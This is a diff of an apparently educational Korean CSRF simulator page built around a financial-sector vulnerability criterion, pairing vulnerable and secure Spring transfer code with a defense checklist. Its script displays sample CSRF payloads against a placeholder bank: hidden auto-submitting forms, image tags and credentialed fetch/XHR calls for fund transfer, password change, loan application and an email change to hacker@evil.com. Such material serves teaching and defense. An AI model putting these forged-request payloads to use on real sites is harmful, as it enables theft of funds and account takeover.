@@ -3,133 +3,776 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Attack Simulation</title>
+    <title>금융권 CSRF 취약점 시뮬레이터</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+KR:wght@300;400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&display=swap');
         body { font-family: 'Noto Sans KR', sans-serif; }
+        .code-font { font-family: 'Courier New', monospace; }
     </style>
 </head>
-<body class="bg-slate-50 p-8 h-screen flex flex-col">
+<body class="bg-gray-100 p-4">
 
-    <div class="mb-6">
-        <div class="flex items-center gap-3 mb-2">
-            <div class="p-2 bg-orange-100 text-orange-600 rounded-lg">
-                <i class="fas fa-cookie-bite text-xl"></i>
+    <!-- 평가기준 배너 -->
+    <div class="max-w-7xl mx-auto mb-4">
+        <div class="bg-orange-600 text-white p-4 rounded-lg shadow-lg">
+            <div class="flex items-center gap-3">
+                <i class="fas fa-clipboard-check text-2xl"></i>
+                <div>
+                    <h1 class="font-bold text-lg">전자금융기반시설 보안 취약점 평가기준 - WEB-SER-028</h1>
+                    <p class="text-sm">크로스사이트 요청변조 (CSRF) | 위험도: 4 (높음) | 통제구분: 5.8.4 서비스 보호</p>
+                </div>
             </div>
-            <h1 class="text-2xl font-bold text-slate-800">CSRF (Cross-Site Request Forgery)</h1>
         </div>
-        <p class="text-slate-500 text-sm">
-            사용자의 의지와 무관하게, 공격자가 의도한 행위(수정, 삭제, 송금 등)를 서버에 요청하게 만드는 공격입니다.
-        </p>
     </div>
 
-    <div class="flex-1 grid grid-cols-1 md:grid-cols-2 gap-8 items-start">
-        
-        <!-- 1. Victim's Bank View -->
-        <div class="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden h-full flex flex-col relative">
-            <div class="bg-slate-800 px-4 py-3 flex justify-between items-center text-white">
-                <span class="font-bold"><i class="fas fa-university mr-2"></i>My Safe Bank</span>
-                <span class="text-xs bg-emerald-500 text-slate-900 px-2 py-0.5 rounded font-bold">Logged In</span>
-            </div>
+    <!-- 메인 컨텐츠 -->
+    <div class="max-w-7xl mx-auto">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
             
-            <div class="p-8 flex-1 flex flex-col justify-center">
-                <div class="text-center mb-8">
-                    <p class="text-slate-500 text-sm mb-1">현재 잔액 (Account Balance)</p>
-                    <div class="text-4xl font-bold text-slate-800">$<span id="balance">1,000,000</span></div>
-                </div>
-
-                <div class="border-t border-slate-100 pt-6">
-                    <h4 class="font-bold text-slate-700 mb-4 text-sm">빠른 송금 (Transfer)</h4>
-                    <div class="space-y-3 opacity-50 pointer-events-none">
-                        <input type="text" placeholder="받는 사람 계좌번호" class="w-full p-2 border rounded text-sm bg-slate-50">
-                        <input type="text" placeholder="금액" class="w-full p-2 border rounded text-sm bg-slate-50">
-                        <button class="w-full bg-blue-600 text-white py-2 rounded text-sm">송금하기</button>
-                    </div>
-                    <p class="text-xs text-red-400 mt-2 text-center">* 데모를 위해 입력 폼은 비활성화 상태입니다.</p>
-                </div>
-            </div>
-
-            <!-- Notification Toast -->
-            <div id="bank-toast" class="absolute bottom-4 left-4 right-4 bg-slate-800 text-white p-3 rounded shadow-lg transform translate-y-20 transition-transform duration-300 flex items-center gap-3">
-                <i class="fas fa-bell text-yellow-400"></i>
-                <div class="text-sm">
-                    <p class="font-bold">알림</p>
-                    <p id="toast-msg">메시지 내용</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- 2. Attacker's Trap Site -->
-        <div class="bg-slate-100 rounded-xl shadow-inner border border-slate-200 h-full flex flex-col relative overflow-hidden">
-            <!-- Browser Chrome -->
-            <div class="bg-slate-200 px-3 py-2 flex items-center gap-2 border-b border-slate-300">
-                <div class="flex gap-1">
-                    <div class="w-2.5 h-2.5 rounded-full bg-red-400"></div>
-                    <div class="w-2.5 h-2.5 rounded-full bg-yellow-400"></div>
-                    <div class="w-2.5 h-2.5 rounded-full bg-green-400"></div>
-                </div>
-                <div class="flex-1 bg-white h-6 rounded text-[10px] flex items-center px-2 text-slate-500 truncate">
-                    http://win-prizes-free.com/event/lucky-draw
-                </div>
-            </div>
-
-            <div class="p-8 flex-1 flex flex-col items-center justify-center text-center bg-gradient-to-br from-yellow-50 to-orange-50">
-                <div class="animate-bounce mb-4 text-6xl">🎁</div>
-                <h2 class="text-2xl font-bold text-red-600 mb-2">축하합니다! 당첨되셨습니다!</h2>
-                <p class="text-slate-600 mb-8 text-sm">
-                    지금 바로 아래 버튼을 클릭하여<br>
-                    <strong>최신형 스마트폰</strong>을 수령하세요!
-                </p>
-
-                <button onclick="triggerCSRF()" class="bg-red-500 hover:bg-red-600 text-white font-bold py-3 px-8 rounded-full shadow-lg transform hover:scale-105 transition-all flex items-center gap-2">
-                    <i class="fas fa-gift"></i> 경품 수령하기
-                </button>
+            <!-- 좌측: 피해자 은행 시스템 -->
+            <div class="space-y-4">
                 
-                <p class="mt-6 text-xs text-slate-400">
-                    (버튼 뒤에는 은행 서버로 송금을 요청하는 스크립트가 숨겨져 있습니다)
-                </p>
+                <!-- 은행 헤더 -->
+                <div class="bg-blue-600 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex items-center gap-3">
+                        <i class="fas fa-building-columns text-2xl"></i>
+                        <div>
+                            <h2 class="text-xl font-bold">XX은행</h2>
+                            <p class="text-sm">인터넷뱅킹 - 로그인 상태</p>
+                        </div>
+                    </div>
+                    <div class="mt-2 flex items-center gap-2">
+                        <span class="bg-green-500 px-3 py-1 rounded text-sm">
+                            <i class="fas fa-check-circle"></i> 홍길동님 로그인 중
+                        </span>
+                        <span class="bg-orange-500 px-3 py-1 rounded text-sm">
+                            <i class="fas fa-exclamation-triangle"></i> 취약점: CSRF 토큰 없음
+                        </span>
+                    </div>
+                </div>
+
+                <!-- 계좌 정보 -->
+                <div class="bg-white p-5 rounded-lg shadow-lg">
+                    <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
+                        <i class="fas fa-wallet text-blue-600"></i>
+                        내 계좌
+                    </h3>
+                    
+                    <div class="bg-gray-50 p-4 rounded-lg mb-4">
+                        <p class="text-sm text-gray-600 mb-1">입출금 통장</p>
+                        <p class="text-lg font-bold">110-123-456789</p>
+                        <div class="mt-3 flex items-baseline gap-2">
+                            <span class="text-sm text-gray-600">잔액:</span>
+                            <span id="balance" class="text-3xl font-bold text-blue-600">5,000,000</span>
+                            <span class="text-lg text-gray-600">원</span>
+                        </div>
+                    </div>
+
+                    <div class="flex gap-2">
+                        <button class="flex-1 bg-blue-600 text-white py-2 rounded hover:bg-blue-700">
+                            <i class="fas fa-exchange-alt"></i> 이체
+                        </button>
+                        <button class="flex-1 bg-gray-600 text-white py-2 rounded hover:bg-gray-700">
+                            <i class="fas fa-list"></i> 거래내역
+                        </button>
+                    </div>
+                </div>
+
+                <!-- 피싱 사이트 -->
+                <div class="bg-gradient-to-br from-yellow-50 to-red-50 p-5 rounded-lg shadow-lg border-2 border-red-300">
+                    <div class="bg-red-600 text-white px-2 py-1 rounded text-xs mb-3 inline-block">
+                        <i class="fas fa-skull-crossbones"></i> 악성 피싱 사이트
+                    </div>
+                    
+                    <div class="text-center">
+                        <div class="text-5xl mb-3">🎁</div>
+                        <h3 class="font-bold text-xl text-red-600 mb-2">
+                            축하합니다! 100만원 경품 당첨!
+                        </h3>
+                        <p class="text-sm text-gray-700 mb-4">
+                            아래 버튼을 클릭하여 경품을 수령하세요
+                        </p>
+                        
+                        <button onclick="showMaliciousCode(1)" 
+                                class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg shadow-lg">
+                            <i class="fas fa-gift"></i> 경품 받기
+                        </button>
+                        
+                        <div id="maliciousCode" class="mt-4 bg-gray-900 p-3 rounded code-font text-xs text-left text-green-400 hidden">
+                            <div class="flex justify-between items-center mb-2">
+                                <span class="text-gray-500">// 버튼 뒤 숨겨진 실제 악성 코드</span>
+                                <span class="text-red-400 text-xs">🚨 실행 중</span>
+                            </div>
+                            <pre id="maliciousCodeContent" class="text-yellow-400"></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 공격 시나리오 버튼 -->
+                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-flask text-orange-400"></i>
+                        CSRF 공격 시나리오
+                    </h3>
+                    <div class="space-y-2">
+                        <button onclick="showMaliciousCode(1)" 
+                                class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-money-bill-transfer"></i> 시나리오 1: 계좌 이체 (전액 탈취)
+                        </button>
+                        <button onclick="showMaliciousCode(2)" 
+                                class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-key"></i> 시나리오 2: 비밀번호 변경
+                        </button>
+                        <button onclick="showMaliciousCode(3)" 
+                                class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-hand-holding-dollar"></i> 시나리오 3: 대출 신청
+                        </button>
+                        <button onclick="showMaliciousCode(4)" 
+                                class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-envelope"></i> 시나리오 4: 이메일 주소 변경
+                        </button>
+                        <button onclick="resetSimulation()" 
+                                class="w-full text-left bg-gray-600 hover:bg-gray-500 px-3 py-2 rounded text-sm mt-4">
+                            <i class="fas fa-redo"></i> 리셋 (시뮬레이션 초기화)
+                        </button>
+                    </div>
+                </div>
+
+                <!-- 실제 악성 코드 예시 -->
+                <div id="realAttackCode" class="hidden bg-red-900 text-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-2 flex items-center gap-2">
+                        <i class="fas fa-code"></i> 실제 사용되는 CSRF 공격 코드
+                    </h3>
+                    <div class="text-xs mb-2">
+                        <span class="bg-red-700 px-2 py-1 rounded">현재 시나리오: <span id="currentScenario"></span></span>
+                    </div>
+                    <pre id="realCodeContent" class="code-font text-xs bg-black p-3 rounded overflow-auto max-h-[250px] text-green-400"></pre>
+                </div>
+
+                <!-- 취약한 코드 -->
+                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex justify-between items-center mb-3">
+                        <h3 class="font-bold text-red-400">
+                            <i class="fas fa-skull-crossbones"></i> 취약한 Java 코드
+                        </h3>
+                        <span class="text-xs bg-red-600 px-2 py-1 rounded">위험</span>
+                    </div>
+                    <pre class="code-font text-xs overflow-x-auto"><code><span class="text-gray-500">// ❌ 취약한 코드 - CSRF 토큰 검증 없음</span>
+@PostMapping("/transfer")
+public String transfer(
+    @RequestParam String toAccount,
+    @RequestParam Long amount,
+    HttpSession session) {
+    
+    <span class="text-red-400">// 세션만 확인 (CSRF 토큰 없음!)</span>
+    User user = (User) session.getAttribute("user");
+    if (user == null) {
+        return "redirect:/login";
+    }
+    
+    <span class="text-red-400">// CSRF 토큰 검증 없이 바로 이체 실행</span>
+    bankService.transfer(
+        user.getAccount(),
+        toAccount,
+        amount
+    );
+    
+    return "transfer_success";
+}</code></pre>
+                </div>
+
             </div>
+
+            <!-- 우측: 결과 및 안전한 코드 -->
+            <div class="space-y-4">
+                
+                <!-- 서버 로그 -->
+                <div class="bg-white rounded-lg shadow-lg overflow-hidden">
+                    <div class="bg-gray-800 text-white px-4 py-3 flex justify-between items-center">
+                        <h3 class="font-bold">
+                            <i class="fas fa-terminal"></i> 은행 서버 로그
+                        </h3>
+                        <span id="statusBadge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded code-font">
+                            SECURE
+                        </span>
+                    </div>
+                    <div id="serverLog" class="p-5 min-h-[250px] bg-gray-900 text-green-400 code-font text-xs space-y-1 overflow-auto">
+                        <div class="text-gray-500">[SERVER] Banking system ready...</div>
+                        <div class="text-gray-500">[SESSION] User 홍길동 logged in</div>
+                    </div>
+                </div>
+
+                <!-- 공격 성공 알림 -->
+                <div id="attackSuccess" class="hidden bg-red-100 border-l-4 border-red-600 p-4 rounded-lg">
+                    <h4 class="font-bold text-red-700 mb-2 flex items-center gap-2">
+                        <i class="fas fa-exclamation-triangle"></i> CSRF 공격 성공!
+                    </h4>
+                    <div id="attackDetails" class="text-sm text-red-700"></div>
+                </div>
+
+                <!-- 공격 단계 -->
+                <div id="attackStages" class="hidden bg-orange-100 border-l-4 border-orange-600 p-4 rounded-lg">
+                    <h4 class="font-bold text-orange-700 mb-2 flex items-center gap-2">
+                        <i class="fas fa-list-ol"></i> 공격 진행 단계
+                    </h4>
+                    <div id="stagesContent" class="text-sm text-orange-700 space-y-1"></div>
+                </div>
+
+                <!-- 안전한 코드 -->
+                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex justify-between items-center mb-3">
+                        <h3 class="font-bold text-green-400">
+                            <i class="fas fa-shield-halved"></i> 안전한 Java 코드
+                        </h3>
+                        <span class="text-xs bg-green-600 px-2 py-1 rounded">권장</span>
+                    </div>
+                    <pre class="code-font text-xs overflow-x-auto max-h-[500px]"><code><span class="text-green-400">// ✅ 안전한 코드 - CSRF 토큰 검증</span>
+@PostMapping("/transfer")
+public String transfer(
+    @RequestParam String toAccount,
+    @RequestParam Long amount,
+    @RequestParam String csrfToken,
+    HttpSession session) {
+    
+    <span class="text-green-400">// 1. 세션 확인</span>
+    User user = (User) session.getAttribute("user");
+    if (user == null) {
+        return "redirect:/login";
+    }
+    
+    <span class="text-green-400">// 2. CSRF 토큰 검증 (필수!)</span>
+    String sessionToken = 
+        (String) session.getAttribute("csrfToken");
+    
+    if (sessionToken == null || 
+        !sessionToken.equals(csrfToken)) {
+        throw new SecurityException(
+            "CSRF token validation failed"
+        );
+    }
+    
+    <span class="text-green-400">// 3. 추가 검증: Referer 확인</span>
+    String referer = request.getHeader("Referer");
+    if (referer == null || 
+        !referer.startsWith("https://xxbank.com")) {
+        throw new SecurityException(
+            "Invalid referer"
+        );
+    }
+    
+    <span class="text-green-400">// 4. 이체 실행</span>
+    bankService.transfer(
+        user.getAccount(),
+        toAccount,
+        amount
+    );
+    
+    <span class="text-green-400">// 5. 토큰 재생성 (One-time use)</span>
+    String newToken = generateCSRFToken();
+    session.setAttribute("csrfToken", newToken);
+    
+    return "transfer_success";
+}
+
+<span class="text-green-400">// CSRF 토큰 생성</span>
+private String generateCSRFToken() {
+    return UUID.randomUUID().toString();
+}
+
+<span class="text-green-400">// Spring Security 설정</span>
+@Configuration
+public class SecurityConfig {
+    
+    @Bean
+    public SecurityFilterChain filterChain(
+            HttpSecurity http) throws Exception {
+        
+        http
+            <span class="text-green-400">// CSRF 보호 활성화</span>
+            .csrf(csrf -> csrf
+                .csrfTokenRepository(
+                    CookieCsrfTokenRepository
+                        .withHttpOnlyFalse()
+                )
+            )
             
-            <!-- Hidden Exploit Representation -->
-            <div class="absolute bottom-0 left-0 w-full bg-slate-800 text-slate-400 p-2 text-[10px] font-mono border-t border-slate-700">
-                <span class="text-red-400">&lt;img src="http://bank.com/transfer?to=hacker&amt=all"&gt;</span> (Hidden Request)
+            <span class="text-green-400">// SameSite 쿠키 설정</span>
+            .sessionManagement(session -> session
+                .sessionCreationPolicy(
+                    SessionCreationPolicy.IF_REQUIRED
+                )
+            );
+        
+        return http.build();
+    }
+}
+
+<span class="text-green-400">// JSP/Thymeleaf에서 토큰 사용</span>
+<span class="text-gray-500">&lt;!-- JSP --&gt;</span>
+&lt;form action="/transfer" method="post"&gt;
+    &lt;input type="hidden" 
+           name="csrfToken" 
+           value="${csrfToken}"/&gt;
+    &lt;!-- 폼 필드 --&gt;
+&lt;/form&gt;
+
+<span class="text-gray-500">&lt;!-- Thymeleaf --&gt;</span>
+&lt;form th:action="@{/transfer}" method="post"&gt;
+    &lt;input type="hidden" 
+           th:name="${_csrf.parameterName}" 
+           th:value="${_csrf.token}"/&gt;
+    &lt;!-- 폼 필드 --&gt;
+&lt;/form&gt;
+
+<span class="text-green-400">// Double Submit Cookie 패턴</span>
+@PostMapping("/transfer")
+public String transfer(
+    @CookieValue("XSRF-TOKEN") String cookieToken,
+    @RequestParam("_csrf") String formToken,
+    HttpSession session) {
+    
+    <span class="text-green-400">// 쿠키 토큰과 폼 토큰 비교</span>
+    if (!cookieToken.equals(formToken)) {
+        throw new SecurityException(
+            "CSRF token mismatch"
+        );
+    }
+    
+    // 계속 처리...
+}</code></pre>
+                </div>
+
+                <!-- 방어 체크리스트 -->
+                <div class="bg-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-list-check text-orange-600"></i>
+                        CSRF 방어 체크리스트
+                    </h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>CSRF 토큰:</strong> 모든 상태 변경 요청에 토큰 검증</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>SameSite 쿠키:</strong> Strict 또는 Lax 설정</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>Referer 검증:</strong> 요청 출처 확인</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>토큰 재생성:</strong> 사용 후 토큰 무효화</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>Custom Header:</strong> X-Requested-With 확인</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 평가 판정 -->
+                <div id="judgementBox" class="hidden bg-gray-900 text-white p-4 rounded-lg">
+                    <h3 class="font-bold text-indigo-400 mb-2 text-sm">
+                        <i class="fas fa-gavel"></i> 평가 판정
+                    </h3>
+                    <div class="text-xs space-y-1">
+                        <div><strong>평가항목:</strong> WEB-SER-028 CSRF</div>
+                        <div><strong>판정:</strong> <span id="judgement"></span></div>
+                        <div><strong>근거:</strong> <span id="evidence"></span></div>
+                    </div>
+                </div>
+
+                <!-- 피해 시나리오 -->
+                <div id="damageBox" class="hidden bg-orange-700 text-white p-4 rounded-lg">
+                    <h3 class="font-bold mb-3">
+                        <i class="fas fa-fire"></i> 금융권 CSRF 피해
+                    </h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex gap-2">
+                            <span class="font-bold">1.</span>
+                            <div><strong>무단 계좌이체</strong><br>피해자 계좌에서 자동 송금</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">2.</span>
+                            <div><strong>비밀번호 변경</strong><br>계정 접근 권한 탈취</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">3.</span>
+                            <div><strong>무단 대출 신청</strong><br>피해자 명의 대출 실행</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">4.</span>
+                            <div><strong>연락처 변경</strong><br>2차 인증 우회</div>
+                        </div>
+                    </div>
+                </div>
+
             </div>
         </div>
     </div>
 
     <script>
-        function triggerCSRF() {
-            // 1. Show visual cue on attacker side
-            const btn = event.currentTarget;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 요청 처리중...';
+        let currentScenario = 0;
+
+        function showMaliciousCode(scenario) {
+            currentScenario = scenario;
             
-            setTimeout(() => {
-                // 2. Execute Attack (Simulated)
-                const balanceEl = document.getElementById('balance');
-                const toast = document.getElementById('bank-toast');
-                const toastMsg = document.getElementById('toast-msg');
+            // 악성 코드 표시
+            document.getElementById('maliciousCode').classList.remove('hidden');
+            document.getElementById('realAttackCode').classList.remove('hidden');
+            
+            let scenarioName = '';
+            let maliciousHTML = '';
+            let realCode = '';
+            
+            if (scenario === 1) {
+                scenarioName = '계좌 이체 공격';
+                maliciousHTML = `<span class="text-yellow-400">// 자동 제출 폼 (사용자 몰래)</span>
+&lt;form id="csrfForm" 
+      action="https://xxbank.com/api/transfer" 
+      method="POST"&gt;
+  &lt;input name="toAccount" value="999-888-777777"/&gt;
+  &lt;input name="amount" value="5000000"/&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  document.getElementById('csrfForm').submit();
+&lt;/script&gt;`;
 
-                // Update Balance
-                balanceEl.innerText = "0";
-                balanceEl.classList.add('text-red-500');
+                realCode = `<span class="text-gray-500">/* 피싱 사이트에 실제 삽입되는 HTML/JS 코드 */</span>
 
-                // Show Notification
-                toastMsg.innerText = "해커 계좌로 $1,000,000 이체 완료";
-                toast.querySelector('i').className = "fas fa-exclamation-triangle text-red-500";
-                toast.classList.remove('translate-y-20');
+<span class="text-yellow-400">&lt;!-- 방법 1: 자동 제출 폼 --&gt;</span>
+&lt;form id="attackForm" 
+      action="https://xxbank.com/api/transfer" 
+      method="POST"
+      style="display:none"&gt;
+  &lt;input name="toAccount" value="999-888-777777"/&gt;
+  &lt;input name="amount" value="5000000"/&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  window.onload = function() {
+    document.getElementById('attackForm').submit();
+  };
+&lt;/script&gt;
 
-                // Reset Button
-                btn.innerHTML = '<i class="fas fa-check"></i> 전송 완료';
-                btn.className = "bg-slate-400 text-white font-bold py-3 px-8 rounded-full shadow-none cursor-default";
+<span class="text-yellow-400">&lt;!-- 방법 2: 이미지 태그 이용 --&gt;</span>
+&lt;img src="https://xxbank.com/api/transfer?toAccount=999-888-777777&amount=5000000" 
+     style="display:none"/&gt;
+
+<span class="text-yellow-400">&lt;!-- 방법 3: Fetch API --&gt;</span>
+&lt;script&gt;
+  fetch('https://xxbank.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',  // 쿠키 포함!
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      toAccount: '999-888-777777',
+      amount: 5000000
+    })
+  });
+&lt;/script&gt;`;
                 
-                // Hide toast after delay
-                setTimeout(() => {
-                    toast.classList.add('translate-y-20');
-                }, 4000);
+            } else if (scenario === 2) {
+                scenarioName = '비밀번호 변경 공격';
+                maliciousHTML = `<span class="text-yellow-400">// 비밀번호 변경 요청</span>
+&lt;form action="https://xxbank.com/change-password" 
+      method="POST"&gt;
+  &lt;input name="newPassword" value="hacker123!@#"/&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;`;
 
+                realCode = `<span class="text-gray-500">/* 비밀번호 변경 CSRF 공격 */</span>
+
+<span class="text-yellow-400">&lt;!-- 숨겨진 폼으로 비밀번호 변경 --&gt;</span>
+&lt;form id="pwdChange" 
+      action="https://xxbank.com/api/change-password" 
+      method="POST"&gt;
+  &lt;input name="newPassword" value="hacker123!@#"/&gt;
+  &lt;input name="confirmPassword" value="hacker123!@#"/&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  setTimeout(function() {
+    document.getElementById('pwdChange').submit();
+  }, 1000);  // 1초 후 자동 실행
+&lt;/script&gt;
+
+<span class="text-yellow-400">&lt;!-- AJAX 방식 --&gt;</span>
+&lt;script&gt;
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://xxbank.com/api/change-password');
+  xhr.withCredentials = true;  // 쿠키 포함
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.send('newPassword=hacker123!@#&confirmPassword=hacker123!@#');
+&lt;/script&gt;`;
+                
+            } else if (scenario === 3) {
+                scenarioName = '대출 신청 공격';
+                maliciousHTML = `<span class="text-yellow-400">// 대출 신청 (5천만원)</span>
+&lt;form action="https://xxbank.com/loan/apply" 
+      method="POST"&gt;
+  &lt;input name="amount" value="50000000"/&gt;
+  &lt;input name="period" value="60"/&gt;
+  &lt;input name="targetAccount" value="해커계좌"/&gt;
+&lt;/form&gt;`;
+
+                realCode = `<span class="text-gray-500">/* 무단 대출 신청 CSRF 공격 */</span>
+
+<span class="text-yellow-400">&lt;!-- 피해자 명의로 대출 신청 --&gt;</span>
+&lt;iframe name="hiddenFrame" style="display:none"&gt;&lt;/iframe&gt;
+&lt;form id="loanForm" 
+      action="https://xxbank.com/api/loan/apply" 
+      method="POST"
+      target="hiddenFrame"&gt;
+  &lt;input name="amount" value="50000000"/&gt;
+  &lt;input name="period" value="60"/&gt;
+  &lt;input name="purpose" value="생활자금"/&gt;
+  &lt;input name="depositAccount" value="999-888-777777"/&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  document.getElementById('loanForm').submit();
+&lt;/script&gt;
+
+<span class="text-yellow-400">&lt;!-- 결과를 숨기기 위해 iframe 사용 --&gt;</span>
+<span class="text-gray-500">// 사용자는 대출 신청된 것을 바로 알지 못함</span>`;
+                
+            } else if (scenario === 4) {
+                scenarioName = '이메일 변경 공격';
+                maliciousHTML = `<span class="text-yellow-400">// 이메일 주소 변경</span>
+&lt;form action="https://xxbank.com/profile/email" 
+      method="POST"&gt;
+  &lt;input name="email" value="hacker@evil.com"/&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;`;
+
+                realCode = `<span class="text-gray-500">/* 이메일 변경으로 2차 인증 우회 */</span>
+
+<span class="text-yellow-400">&lt;!-- 이메일 주소를 해커 이메일로 변경 --&gt;</span>
+&lt;form id="emailChange" 
+      action="https://xxbank.com/api/profile/email" 
+      method="POST"&gt;
+  &lt;input name="email" value="hacker@evil.com"/&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  <span class="text-gray-500">// 버튼 클릭 시 실행</span>
+  document.querySelector('button').addEventListener('click', function() {
+    document.getElementById('emailChange').submit();
+  });
+&lt;/script&gt;
+
+<span class="text-yellow-400">&lt;!-- 이후 공격 시나리오 --&gt;</span>
+<span class="text-gray-500">// 1. 이메일이 해커 이메일로 변경됨
+// 2. 해커가 "비밀번호 찾기" 요청
+// 3. 재설정 링크가 해커 이메일로 전송
+// 4. 해커가 계정 완전 장악</span>`;
+            }
+            
+            document.getElementById('maliciousCodeContent').innerHTML = maliciousHTML;
+            document.getElementById('currentScenario').textContent = scenarioName;
+            document.getElementById('realCodeContent').innerHTML = realCode;
+            
+            // 실제 공격 실행
+            setTimeout(function() {
+                triggerCSRF(scenario);
             }, 1000);
+        }
+
+        function resetSimulation() {
+            currentScenario = 0;
+            
+            // 잔액 복구
+            document.getElementById('balance').textContent = '5,000,000';
+            document.getElementById('balance').className = 'text-3xl font-bold text-blue-600';
+            
+            // 로그 초기화
+            document.getElementById('serverLog').innerHTML = 
+                '<div class="text-gray-500">[SERVER] Banking system ready...</div>' +
+                '<div class="text-gray-500">[SESSION] User 홍길동 logged in</div>';
+            
+            // 상태 배지 초기화
+            document.getElementById('statusBadge').textContent = 'SECURE';
+            document.getElementById('statusBadge').className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded code-font';
+            
+            // 숨기기
+            document.getElementById('maliciousCode').classList.add('hidden');
+            document.getElementById('realAttackCode').classList.add('hidden');
+            document.getElementById('attackSuccess').classList.add('hidden');
+            document.getElementById('attackStages').classList.add('hidden');
+            document.getElementById('judgementBox').classList.add('hidden');
+            document.getElementById('damageBox').classList.add('hidden');
+        }
+
+        function resetBalance() {
+            document.getElementById('balance').textContent = '5,000,000';
+            document.getElementById('balance').className = 'text-3xl font-bold text-blue-600';
+        }
+
+        async function triggerCSRF(scenario) {
+            var logBox = document.getElementById('serverLog');
+            var badge = document.getElementById('statusBadge');
+            
+            document.getElementById('attackSuccess').classList.add('hidden');
+            document.getElementById('attackStages').classList.add('hidden');
+            document.getElementById('judgementBox').classList.add('hidden');
+            document.getElementById('damageBox').classList.add('hidden');
+
+            badge.textContent = 'ATTACKING...';
+            badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded code-font animate-pulse';
+            
+            addLog('[ATTACK] Malicious code executed on phishing site', 'text-red-400');
+            await sleep(500);
+            addLog('[REQUEST] Forged request sent to bank server', 'text-yellow-400');
+            await sleep(500);
+            addLog('[COOKIE] Session cookie automatically included', 'text-orange-400');
+            await sleep(500);
+
+            if (scenario === 1) {
+                // 계좌 이체
+                addLog('[POST] https://xxbank.com/api/transfer', 'text-blue-400');
+                await sleep(300);
+                addLog('[PAYLOAD] toAccount=999-888-777777, amount=5000000', 'text-gray-400');
+                await sleep(300);
+                addLog('[VALIDATION] Session check: PASS ✓', 'text-green-400');
+                await sleep(300);
+                addLog('[VALIDATION] CSRF token check: SKIPPED ✗', 'text-red-400');
+                await sleep(500);
+                addLog('[DANGER] Transfer executed without CSRF protection!', 'text-red-500 font-bold');
+                await sleep(500);
+                addLog('[RESULT] ₩5,000,000 transferred to hacker account', 'text-red-500 font-bold');
+                
+                document.getElementById('balance').textContent = '0';
+                document.getElementById('balance').className = 'text-3xl font-bold text-red-600 animate-pulse';
+                
+                document.getElementById('attackSuccess').classList.remove('hidden');
+                document.getElementById('attackDetails').innerHTML = 
+                    '<strong>✓ 공격 성공!</strong><br>' +
+                    '피해자 계좌에서 <strong class="text-xl">₩5,000,000</strong>이 해커 계좌(999-888-777777)로 이체되었습니다.<br>' +
+                    '<span class="text-xs mt-2 block">피해자는 피싱 사이트의 버튼을 클릭했을 뿐, 이체 의사가 없었습니다.</span>';
+                
+                document.getElementById('attackStages').classList.remove('hidden');
+                document.getElementById('stagesContent').innerHTML = 
